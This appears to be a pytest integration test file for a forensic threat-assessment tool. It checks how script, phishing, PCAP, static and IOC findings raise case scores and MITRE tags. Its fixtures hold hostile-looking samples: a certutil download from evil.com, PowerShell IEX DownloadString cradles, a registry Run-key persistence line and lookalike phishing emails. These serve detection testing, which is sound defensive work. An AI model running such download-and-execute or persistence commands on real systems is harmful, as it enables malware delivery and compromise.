"""Integration tests for Phase 2C.6 Unified Forensics -> Threat Assessment."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from ransomeye.investigation import load_investigation
from ransomeye.investigation_graph import build_investigation_graph
from ransomeye.ioc_extractor import IocExtractor, ingest_ioc_finding
from ransomeye.pcap_analyzer import PcapAnalyzer, ingest_pcap_finding
from ransomeye.phishing import MessagePayload, PhishingDetector, ingest_phishing_finding
from ransomeye.report import generate_case_report
from ransomeye.script_analyzer import ScriptAnalyzer, ingest_script_finding
from ransomeye.static_analyzer import StaticAnalyzer, ingest_static_finding
from ransomeye.storage import EvidenceStore
from ransomeye.threat_assessment import assess_case, assess_threat


# --------------------------------------------------------------------------- #
# Helpers & Fixtures
# --------------------------------------------------------------------------- #

def _create_case(tmp_path: Path, case_id: str = "CASE-TEST-001") -> tuple[EvidenceStore, str]:
    db_path = tmp_path / f"{case_id}.db"
    store = EvidenceStore(db_path)
    store.create_case(case_id, case_name="Forensic Test Case", host="WIN-TEST-01")
    return store, case_id


def _create_sysmon_events() -> list[dict[str, Any]]:
    return [
        {
            "event_id": "EVT-PS-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
            "process_guid": "{GUID-P1}",
        },
        {
            "event_id": "EVT-CERT-1",
            "timestamp": "2026-08-08T15:00:10Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe",
            "pid": "1001",
            "process_guid": "{GUID-C1}",
        },
    ]


# --------------------------------------------------------------------------- #
# 1. Sysmon Backward Compatibility
# --------------------------------------------------------------------------- #

def test_sysmon_only_assessment_unchanged():
    """Pure Sysmon events must produce identical scores, severity, and confidence to baseline."""
    events = _create_sysmon_events()
    direct_result = assess_threat(events)

    assert direct_result["score"] >= 50
    assert direct_result["severity"] in ("MEDIUM", "HIGH")
    assert direct_result["finding_count"] == 2
    assert "T1059.001" in direct_result["techniques"]
    assert any("PowerShell" in r for r in direct_result["reasons"])
    assert any("certutil" in r for r in direct_result["reasons"])

    # Baseline call with findings=None must strictly match direct_result
    with_none_findings = assess_threat(events, findings=None)
    assert with_none_findings == direct_result


# --------------------------------------------------------------------------- #
# 2. Script Finding Contribution
# --------------------------------------------------------------------------- #

def test_script_finding_contributes_to_threat_assessment(tmp_path):
    """Ingesting a script finding into a case must trigger assess_case, elevate score, and add MITRE."""
    store, cid = _create_case(tmp_path, "CASE-SCRIPT")
    script_file = tmp_path / "launcher.ps1"
    script_file.write_text(
        "$encoded = 'SGVsbG8='; [System.Convert]::FromBase64String($encoded); IEX (New-Object Net.WebClient).DownloadString('http://bad.org')",
        encoding="utf-8",
    )

    analyzer = ScriptAnalyzer()
    res = analyzer.analyze_file(script_file)
    assert len(res.indicators) > 0

    ids = ingest_script_finding(store, cid, res)
    assert len(ids) > 0

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    assert assessment["score"] > 0
    assert "T1059.001" in assessment["techniques"] or "T1027" in assessment["techniques"]
    assert len(assessment["reasons"]) > 0
    store.close()


# --------------------------------------------------------------------------- #
# 3. Phishing Finding Contribution
# --------------------------------------------------------------------------- #

def test_phishing_finding_contributes_to_threat_assessment(tmp_path):
    """Ingesting a phishing finding must update score, severity, and add MITRE T1566."""
    store, cid = _create_case(tmp_path, "CASE-PHISH")
    payload = MessagePayload.from_dict({
        "subject": "URGENT: Payroll Account Suspended - Action Required Immediately",
        "sender": "security-alert@micros0ft-support.com",
        "text": "Your account has been locked. Click here immediately to verify: http://micros0ft-verify.com/login",
    })

    detector = PhishingDetector()
    res = detector.analyze(payload)
    assert res.score > 0

    fid = ingest_phishing_finding(store, cid, res, payload=payload)
    assert fid > 0

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    assert assessment["score"] >= res.score
    assert any(t.startswith("T1566") for t in assessment["techniques"])
    assert any("Phishing" in r for r in assessment["reasons"])
    store.close()


# --------------------------------------------------------------------------- #
# 4. PCAP Finding Contribution
# --------------------------------------------------------------------------- #

def test_pcap_finding_contributes_to_threat_assessment(tmp_path):
    """Ingesting PCAP indicators must update case score and network MITRE techniques."""
    try:
        from tests.test_pcap import _build_pcap, _http_get_packet
    except ModuleNotFoundError:
        from test_pcap import _build_pcap, _http_get_packet

    store, cid = _create_case(tmp_path, "CASE-PCAP")

    pcap_fixture = tmp_path / "traffic_sample.pcap"
    raw_pcap = _build_pcap([_http_get_packet(host="198.51.100.1")])
    pcap_fixture.write_bytes(raw_pcap)

    analyzer = PcapAnalyzer()
    res = analyzer.analyze_file(pcap_fixture)
    assert len(res.indicators) > 0

    fids = ingest_pcap_finding(store, cid, res)
    assert len(fids) > 0

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    assert assessment["score"] > 0
    assert assessment["severity"] != "SAFE"
    assert any(t.startswith("T1071") or t.startswith("T1048") for t in assessment["techniques"])
    store.close()



# --------------------------------------------------------------------------- #
# 5. Static Finding Contribution
# --------------------------------------------------------------------------- #

def test_static_finding_contributes_to_threat_assessment(tmp_path):
    """Ingesting static findings updates score and adds T1027."""
    store, cid = _create_case(tmp_path, "CASE-STATIC")

    binary_file = tmp_path / "ransom_sample.bin"
    import os
    high_entropy_bytes = os.urandom(8192) + b"YOUR FILES ARE ENCRYPTED DECRYPT README_DECRYPT"
    binary_file.write_bytes(high_entropy_bytes)

    analyzer = StaticAnalyzer()
    res = analyzer.analyze_file(binary_file)
    assert res.total_entropy >= 7.0

    fid = ingest_static_finding(store, cid, res)
    assert fid > 0

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    assert assessment["score"] > 0
    assert "T1027" in assessment["techniques"]
    assert any("Static analysis" in r or "entropy" in r.lower() for r in assessment["reasons"])
    store.close()


# --------------------------------------------------------------------------- #
# 6. Informational IOC Zero Contribution
# --------------------------------------------------------------------------- #

def test_informational_ioc_observations_do_not_inflate_score(tmp_path):
    """Informational IOC observations (IP, domain, URL, hash) must contribute ZERO to score and remain SAFE."""
    store, cid = _create_case(tmp_path, "CASE-IOC-INFO")
    text_file = tmp_path / "network_log.txt"
    text_file.write_text(
        "Standard server IPs: 10.0.0.1, 192.168.1.50, domains: internal.corp, router.local, https://safe.domain/index.html",
        encoding="utf-8",
    )

    extractor = IocExtractor()
    res = extractor.analyze_file(text_file)
    assert len(res.observations) > 0
    assert not any(o.ioc_type == "lolbin" for o in res.observations)

    ids = ingest_ioc_finding(store, cid, res)
    assert len(ids) > 0

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    assert assessment["score"] == 0
    assert assessment["severity"] == "SAFE"
    assert assessment["confidence"] == 0.95
    assert assessment["reasons"] == ["No suspicious activity detected."]
    store.close()


# --------------------------------------------------------------------------- #
# 7. Contextual LOLBIN Contribution
# --------------------------------------------------------------------------- #

def test_lolbin_ioc_contributes_without_inflating_observations(tmp_path):
    """Contextual LOLBIN finding contributes its existing 30 points while ordinary observations add 0."""
    store, cid = _create_case(tmp_path, "CASE-IOC-LOLBIN")
    script_file = tmp_path / "lolbin_artifact.txt"
    script_file.write_text(
        "curl.exe -s http://192.168.1.1/script.vbs -o out.vbs\n"
        "certutil.exe -urlcache -f http://example.com/test.exe\n",
        encoding="utf-8",
    )

    extractor = IocExtractor()
    res = extractor.analyze_file(script_file)
    assert any(o.ioc_type == "lolbin" for o in res.observations)

    ids = ingest_ioc_finding(store, cid, res)
    assert len(ids) > 0

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    assert assessment["score"] == 30
    assert assessment["severity"] == "LOW"
    assert "T1059" in assessment["techniques"]
    assert any("LOLBIN" in r for r in assessment["reasons"])
    store.close()


# --------------------------------------------------------------------------- #
# 8. Independent Rules on Same Artifact
# --------------------------------------------------------------------------- #

def test_independent_rules_on_same_artifact_contribute_separately(tmp_path):
    """Different genuine rule assertions on the same script artifact contribute without an artificial 50-cap."""
    store, cid = _create_case(tmp_path, "CASE-MULTI-RULE")
    script_file = tmp_path / "multi_stage.ps1"
    script_file.write_text(
        "# Obfuscation + DownloadString + IEX + Registry Evasion\n"
        "$enc = 'SGVsbG8='; [System.Convert]::FromBase64String($enc)\n"
        "(New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')\n"
        "Invoke-Expression -Command 'calc.exe'\n"
        "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Persistence' -Value 'calc.exe'\n",
        encoding="utf-8",
    )

    analyzer = ScriptAnalyzer()
    res = analyzer.analyze_file(script_file)
    assert len(res.rule_ids) >= 2

    ids = ingest_script_finding(store, cid, res)
    assert len(ids) >= 2

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    assert assessment["score"] >= 35
    assert len(assessment["reasons"]) >= 2
    store.close()


# --------------------------------------------------------------------------- #
# 9. Analyzer Idempotency
# --------------------------------------------------------------------------- #

def test_re_running_analyzer_is_idempotent(tmp_path):
    """Re-running an analyzer on the same artifact leaves case score, severity, and findings unchanged."""
    store, cid = _create_case(tmp_path, "CASE-IDEMPOTENT")
    script_file = tmp_path / "test.ps1"
    script_file.write_text("powershell.exe -enc AAAA; Invoke-Expression 'whoami'", encoding="utf-8")

    analyzer = ScriptAnalyzer()
    res = analyzer.analyze_file(script_file)

    first_ids = ingest_script_finding(store, cid, res)
    first_assessment = store.get_latest_assessment(cid)
    findings_count_1 = len(store.get_case_findings(cid))

    second_ids = ingest_script_finding(store, cid, res)
    second_assessment = store.get_latest_assessment(cid)
    findings_count_2 = len(store.get_case_findings(cid))

    assert findings_count_1 == findings_count_2
    assert second_assessment["score"] == first_assessment["score"]
    assert second_assessment["severity"] == first_assessment["severity"]
    assert second_assessment["confidence"] == first_assessment["confidence"]
    assert second_assessment["reasons"] == first_assessment["reasons"]
    assert second_assessment["techniques"] == first_assessment["techniques"]
    store.close()


# --------------------------------------------------------------------------- #
# 10. Evidence Traceability Intact
# --------------------------------------------------------------------------- #

def test_evidence_traceability_intact(tmp_path):
    """All contributing findings retain valid finding_evidence links to actual case events."""
    store, cid = _create_case(tmp_path, "CASE-TRACE")
    script_file = tmp_path / "artifact.ps1"
    script_file.write_text("IEX (New-Object Net.WebClient).DownloadString('http://bad.org')", encoding="utf-8")

    res = ScriptAnalyzer().analyze_file(script_file)
    fids = ingest_script_finding(store, cid, res)

    for fid in fids:
        events = store.get_finding_events(fid)
        assert len(events) == 1
        assert events[0]["event_id"].startswith("EVT-SCRIPT-")
        assert events[0]["source"] == "script_analyzer"
        metadata = json.loads(events[0]["metadata_json"])
        assert "sha256" in metadata

    store.close()


# --------------------------------------------------------------------------- #
# 11. Investigation and Report Integration
# --------------------------------------------------------------------------- #

def test_investigation_and_report_reflect_integrated_assessment(tmp_path):
    """load_investigation and generate_case_report accurately present the unified forensic assessment."""
    db_path = tmp_path / "report_case.db"
    store = EvidenceStore(db_path)
    store.create_case("CASE-REP", "Report Test Case", host="SRV-01")

    payload = MessagePayload.from_dict({
        "subject": "Wire Transfer Immediate Confirmation",
        "sender": "ceo@imposter-finance.com",
        "text": "Please transfer $500,000 urgently to account 987654321: http://imposter-finance.com/pay",
    })
    p_res = PhishingDetector().analyze(payload)
    ingest_phishing_finding(store, "CASE-REP", p_res, payload=payload)
    store.close()

    inv = load_investigation(db_path, "CASE-REP")
    assert inv.assessment is not None
    assert inv.assessment["score"] >= p_res.score
    assert inv.summary.threat_score == inv.assessment["score"]
    assert inv.summary.severity == inv.assessment["severity"]

    rep = generate_case_report(db_path, "CASE-REP")
    assert "Score:      " in rep
    assert str(inv.assessment["score"]) in rep
    assert "Phishing" in rep


# --------------------------------------------------------------------------- #
# 12. Qualitative Confidence Coercion
# --------------------------------------------------------------------------- #

def test_qualitative_confidence_handling():
    """Qualitative string confidences ('high', 'medium', 'low') must be coerced without type errors."""
    findings = [
        {"type": "phishing_initial_access", "score": 60, "confidence": "high", "technique": "T1566", "reason": "Phish"},
        {"type": "phishing_initial_access", "score": 40, "confidence": "medium", "technique": "T1566", "reason": "Phish 2"},
        {"type": "phishing_initial_access", "score": 20, "confidence": "low", "technique": "T1566", "reason": "Phish 3"},
    ]
    res = assess_threat([], findings=findings)
    assert isinstance(res["confidence"], float)
    # (0.90 + 0.75 + 0.50) / 3 = 0.7166... -> 0.72
    assert res["confidence"] == 0.72


# --------------------------------------------------------------------------- #
# 13. assess_case() with Empty Case
# --------------------------------------------------------------------------- #

def test_assess_case_empty_case(tmp_path):
    """assess_case on an empty case returns 0 score, SAFE, and 0 findings."""
    store, cid = _create_case(tmp_path, "CASE-EMPTY")
    assessment = assess_case(store, cid)

    assert assessment["score"] == 0
    assert assessment["severity"] == "SAFE"
    assert assessment["confidence"] == 0.95
    assert assessment["finding_count"] == 0
    assert assessment["reasons"] == ["No suspicious activity detected."]
    store.close()


# --------------------------------------------------------------------------- #
# 14. assess_case() with Only Informational IOCs
# --------------------------------------------------------------------------- #

def test_assess_case_only_informational_ioc(tmp_path):
    """assess_case with only informational IOC findings returns 0 threat score and SAFE."""
    store, cid = _create_case(tmp_path, "CASE-ONLY-INFO-IOC")
    doc = tmp_path / "ips.txt"
    doc.write_text("192.168.1.1 10.0.0.1 172.16.0.1", encoding="utf-8")

    res = IocExtractor().analyze_file(doc)
    ingest_ioc_finding(store, cid, res)

    assessment = store.get_latest_assessment(cid)
    assert assessment["score"] == 0
    assert assessment["severity"] == "SAFE"
    assert assessment["confidence"] == 0.95
    store.close()


# --------------------------------------------------------------------------- #
# 15. Repeated assess_case() Calls
# --------------------------------------------------------------------------- #

def test_repeated_assess_case_calls(tmp_path):
    """Repeated assess_case() calls produce identical results."""
    store, cid = _create_case(tmp_path, "CASE-REPEAT")
    sf = tmp_path / "run.ps1"
    sf.write_text("Invoke-Expression 'calc'", encoding="utf-8")
    ingest_script_finding(store, cid, ScriptAnalyzer().analyze_file(sf))

    ass1 = assess_case(store, cid)
    ass2 = assess_case(store, cid)
    assert ass1["score"] == ass2["score"]
    assert ass1["severity"] == ass2["severity"]
    assert ass1["reasons"] == ass2["reasons"]
    store.close()


# --------------------------------------------------------------------------- #
# 16. Multiple Findings Sharing One Evidence Event
# --------------------------------------------------------------------------- #

def test_multiple_findings_sharing_one_evidence_event(tmp_path):
    """Different legitimate rules sharing one evidence event remain distinct and correlate properly."""
    store, cid = _create_case(tmp_path, "CASE-SHARED-EVT")
    sf = tmp_path / "test_shared.ps1"
    sf.write_text("IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('AAA=')))", encoding="utf-8")

    ingest_script_finding(store, cid, ScriptAnalyzer().analyze_file(sf))
    assessment = store.get_latest_assessment(cid)

    assert len(assessment["correlations"]) >= 1
    assert len(assessment["correlations"][0]["finding_ids"]) >= 1
    store.close()


# --------------------------------------------------------------------------- #
# 17. Forensic Findings Without Process Metadata
# --------------------------------------------------------------------------- #

def test_forensic_findings_without_process_metadata(tmp_path):
    """Forensic findings without process metadata do not crash graph or assessment generation."""
    db_path = tmp_path / "no_proc.db"
    store = EvidenceStore(db_path)
    store.create_case("CASE-NO-PROC", "No Process Test")

    payload = MessagePayload.from_dict({
        "subject": "URGENT: Payroll Account Suspended - Action Required Immediately",
        "sender": "security-alert@micros0ft-support.com",
        "text": "Your account has been locked. Click here immediately to verify: http://micros0ft-verify.com/login",
    })
    ingest_phishing_finding(store, "CASE-NO-PROC", PhishingDetector().analyze(payload), payload=payload)
    store.close()

    inv = load_investigation(db_path, "CASE-NO-PROC")
    assert inv.summary.threat_score is not None
    assert inv.summary.threat_score > 0
    # Graph build succeeds without fabricating invalid process nodes
    graph = build_investigation_graph(inv)
    assert graph is not None


# --------------------------------------------------------------------------- #
# 18. Mixed Sysmon + Forensic Case
# --------------------------------------------------------------------------- #

def test_mixed_sysmon_plus_forensic_case(tmp_path):
    """A case containing both Sysmon process creation and forensic artifacts combines all threat signals."""
    store, cid = _create_case(tmp_path, "CASE-MIXED")

    for ev in _create_sysmon_events():
        store.save_event(cid, ev)

    sf = tmp_path / "dropper.ps1"
    sf.write_text("IEX (New-Object Net.WebClient).DownloadString('http://bad.org')", encoding="utf-8")
    ingest_script_finding(store, cid, ScriptAnalyzer().analyze_file(sf))

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    # Score combines Sysmon behavioral rules + Script rules
    assert assessment["score"] >= 50
    assert assessment["severity"] in ("MEDIUM", "HIGH", "CRITICAL")
    assert any("PowerShell" in r for r in assessment["reasons"])
    assert any("[PS-" in r or "[OBF-" in r or "Script" in r for r in assessment["reasons"])
    store.close()


# --------------------------------------------------------------------------- #
# 19. Case with Only Forensic Evidence
# --------------------------------------------------------------------------- #

def test_case_with_only_forensic_evidence(tmp_path):
    """A case with zero Sysmon events and only forensic artifacts evaluates threat correctly."""
    store, cid = _create_case(tmp_path, "CASE-FORENSIC-ONLY")

    sf = tmp_path / "macro.vbs"
    sf.write_text(
        "WScript.CreateObject('WScript.Shell').Run 'powershell.exe -enc AAAA', 0\n"
        "WScript.CreateObject('WScript.Shell').Run 'cmd.exe /c whoami', 0\n",
        encoding="utf-8",
    )
    ingest_script_finding(store, cid, ScriptAnalyzer().analyze_file(sf))

    assessment = store.get_latest_assessment(cid)
    assert assessment is not None
    assert assessment["score"] > 0
    store.close()


# --------------------------------------------------------------------------- #
# 20. Existing Correlation Behavior Unchanged
# --------------------------------------------------------------------------- #

def test_existing_correlation_behavior_unchanged():
    """Existing correlation bonus (+10) requires file activity + process behavior."""
    file_mod_events = [
        {
            "event_id": f"f-{i}",
            "timestamp": f"2026-08-08T15:00:{i:02d}Z",
            "source": "simulation",
            "event_type": "file_modify",
            "file_path": f"C:\\data\\file_{i}.enc",
        }
        for i in range(50)
    ]
    proc_event = {
        "event_id": "p-1",
        "timestamp": "2026-08-08T15:00:10Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc AAAA",
        "pid": "1000",
    }

    combined = assess_threat(file_mod_events + [proc_event])
    proc_only = assess_threat([proc_event])

    assert combined["score"] > proc_only["score"]
